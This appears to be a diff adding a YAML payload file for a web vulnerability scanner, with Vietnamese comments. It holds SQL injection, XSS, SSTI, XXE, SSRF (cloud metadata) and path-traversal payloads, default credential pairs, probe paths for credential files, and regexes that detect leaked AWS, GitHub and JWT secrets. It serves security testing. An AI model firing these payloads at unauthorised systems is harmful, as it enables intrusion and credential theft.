@@ -1,0 +1,139 @@
+# Kho payload và cấu hình cho tất cả các module tester
+
+# Access Control Tester
+access_control:
+  paths:
+    - "/admin"
+    - "/admin/"
+    - "/dashboard"
+    - "/config"
+    - "/.git/"
+    - "/.env"
+    - "/backup/"
+    - "/.aws/credentials"
+    - "/api/users"
+    - "/../../../../etc/passwd"
+  forbidden_keywords:
+    - "unauthorized"
+    - "forbidden"
+    - "access denied"
+    - "permission denied"
+    - "404 not found"
+
+# Authentication Tester
+auth:
+  default_credentials:
+    - { user: "admin", pass: "admin" }
+    - { user: "admin", pass: "password" }
+    - { user: "root", pass: "root" }
+    - { user: "test", pass: "test" }
+  sensitive_path_keywords:
+    - "reset-password"
+    - "change-password"
+    - "2fa"
+    - "mfa"
+  login_form_indicators: ["login", "signin", "authenticate"]
+  login_success_indicators: ["logout", "sign-out", "dashboard", "my account"]
+
+# CSRF Tester
+csrf:
+  token_names: ["csrf", "_token", "xsrf", "authenticity_token"]
+
+# Crypto Tester
+crypto:
+  security_headers:
+    - "Strict-Transport-Security"
+    - "Content-Security-Policy"
+    - "X-Content-Type-Options"
+    - "X-Frame-Options"
+    - "Referrer-Policy"
+  sensitive_cookie_keywords: ["session", "auth", "token", "jwt", "remember"]
+  jwt_regex: 'eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]*'
+
+# Info Leak Tester
+info_leak:
+  patterns:
+    - { type: "Email Address", regex: '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b', severity: "Low", subcategory: "Email Address" }
+    - { type: "JWT Token", regex: '\beyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_.+/=]*\b', severity: "High", subcategory: "Exposed Credentials" }
+    - { type: "AWS Access Key ID", regex: '\bAKIA[0-9A-Z]{16}\b', severity: "Critical", subcategory: "Cloud Credentials" }
+    - { type: "Google API Key", regex: '\bAIza[0-9A-Za-z\-_]{35}\b', severity: "High", subcategory: "Exposed Credentials" }
+    - { type: "GitHub Token", regex: '\bghp_[A-Za-z0-9]{36}\b', severity: "High", subcategory: "Exposed Credentials" }
+
+# Integrity Tester
+integrity:
+  trusted_domains: ["cdnjs.cloudflare.com", "ajax.googleapis.com", "cdn.jsdelivr.net", "maxcdn.bootstrapcdn.com", "code.jquery.com"]
+
+# Local File Inclusion Tester
+lfi:
+  payloads: ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/proc/self/environ"]
+  indicators: ["root:x:0:0:", "[extensions]", "PATH=", "[boot loader]"]
+
+# Logging Tester
+logging:
+  paths: ["/error.log", "/debug.log", "/access.log", "/server.log", "/app.log"]
+  sensitive_patterns:
+    - { regex: 'password\s*[:=]\s*\S+', description: "Password Leak" }
+    - { regex: 'Authorization:\s*Bearer\s+\S+', description: "Authorization Token Leak" }
+    - { regex: 'api_key\s*[:=]\s*\S+', description: "API Key Leak" }
+  debug_keywords: ["stack trace", "traceback", "exception", "debug mode"]
+
+# Miscellaneous Tester
+misc:
+  error_keywords: ["stack trace", "traceback", "exception", "fatal error", "debug mode"]
+  security_policy:
+    path_keywords: ["security.txt", "security-policy"]
+    sensitive_terms: ["vulnerability", "exploit", "leak", "poc"]
+  privacy_policy:
+    path_keywords: ["privacy-policy", "privacy"]
+    sensitive_terms: ["user id", "session id", "auth_token"]
+  scoreboard:
+    path_keywords: ["scoreboard"]
+    content_keywords: ["admin", "ctf"]
+  chatbot:
+    path_keywords: ["/chatbot/kill", "/chatbot/disable"]
+
+# Outdated Component Tester
+outdated_component:
+  libraries:
+    - { name: "jQuery", regex: 'jQuery v([0-9.]+)', latest: "3.7.1" }
+    - { name: "Bootstrap", regex: 'Bootstrap v([0-9.]+)', latest: "5.3.3" }
+    - { name: "AngularJS", regex: 'AngularJS v([0-9.]+)', latest: "1.8.2" }
+    - { name: "React", regex: 'React v([0-9.]+)', latest: "18.2.0" }
+
+# SQL Injection Tester
+sqli:
+  error_based_payloads: ["'", "\"", "' OR 1=1--", "'; WAITFOR DELAY '0:0:5'--"]
+  time_based_payloads: ["' OR SLEEP(5)--", "' OR BENCHMARK(10000000,MD5(1))--"]
+  boolean_based_payloads:
+    - { true: "' AND 1=1--", false: "' AND 1=2--" }
+  error_patterns: ["sql syntax", "mysql", "unclosed quotation", "syntax error", "ora-"]
+  time_delay_seconds: 4
+
+# Server-Side Request Forgery Tester
+ssrf:
+  payloads:
+    - { payload: "http://169.254.169.254/latest/meta-data/", indicator: "instance-id", subcategory: "Cloud Metadata" }
+    - { payload: "http://127.0.0.1/admin", indicator: "dashboard", subcategory: "Local Network" }
+    - { payload: "file:///etc/passwd", indicator: "root:x:0:0", subcategory: "Local File" }
+
+# Server-Side Template Injection Tester
+ssti:
+  payloads:
+    - { payload: "{{7*7}}", response: "49", engine: "Jinja2/Twig", subcategory: "Expression Evaluation" }
+    - { payload: "${7*7}", response: "49", engine: "FreeMarker", subcategory: "Expression Evaluation" }
+    - { payload: "<%= 7*7 %>", response: "49", engine: "ERB", subcategory: "Expression Evaluation" }
+
+# Cross-Site Scripting Tester
+xss:
+  payloads:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "'\"><svg/onload=alert('XSS')>"
+
+# XML External Entity Tester
+xxe:
+  endpoint_keywords: ["/api", "/soap", "/xml", ".xml", ".wsdl"]
+  payloads:
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
+    - { payload: '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>', subcategory: "File Disclosure" }
+  indicators: ["root:x:0:0:", "www-data:", "daemon:"]
